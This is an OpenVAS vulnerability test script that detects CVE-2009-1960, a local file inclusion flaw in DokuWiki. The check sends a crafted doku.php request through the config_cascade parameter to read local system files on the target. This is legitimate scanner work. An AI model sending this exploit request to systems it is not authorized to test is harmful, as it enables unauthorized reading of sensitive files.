###############################################################################
# OpenVAS Vulnerability Test
#
# DokuWiki 'doku.php' Local File Inclusion Vulnerability
#
# Authors:
# Nikita MR <rnikita@secpod.com>
#
# Copyright:
# Copyright (C) 2009 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:dokuwiki:dokuwiki';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800582");
  script_version("2022-05-09T13:48:18+0000");
  script_cve_id("CVE-2009-1960");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"last_modification", value:"2022-05-09 13:48:18 +0000 (Mon, 09 May 2022)");
  script_tag(name:"creation_date", value:"2009-06-19 09:45:44 +0200 (Fri, 19 Jun 2009)");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_name("DokuWiki 'doku.php' Local File Inclusion Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_dokuwiki_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("dokuwiki/installed");

  script_xref(name:"URL", value:"http://secunia.com/advisories/35218");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/35095");
  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/8812");
  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/8781");
  script_xref(name:"URL", value:"http://bugs.splitbrain.org/index.php?do=details&task_id=1700");

  script_tag(name:"summary", value:"DokuWiki is prone to Local File Inclusion vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted request via HTTP GET and checks whether
  it is possible to read a local file.");

  script_tag(name:"insight", value:"The flaw is due to error in
  'config_cascade[main][default][]' parameter in 'inc/init.php' is not properly
  verified before being used to include files to 'doku.php'.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker
  to include and execute arbitrary files from local and external resources, and
  can gain sensitive information about remote system directories when
  register_globals is enabled.");

  script_tag(name:"affected", value:"DoKuWiki version prior to 2009-02-14b on
  Linux.");

  script_tag(name:"solution", value:"Upgrade to version 2009-02-14b or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

files = traversal_files();

foreach pattern( keys( files ) ) {

  file = files[pattern];

  url = dir + "/doku.php?config_cascade[main][default][]=/" + file;

  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
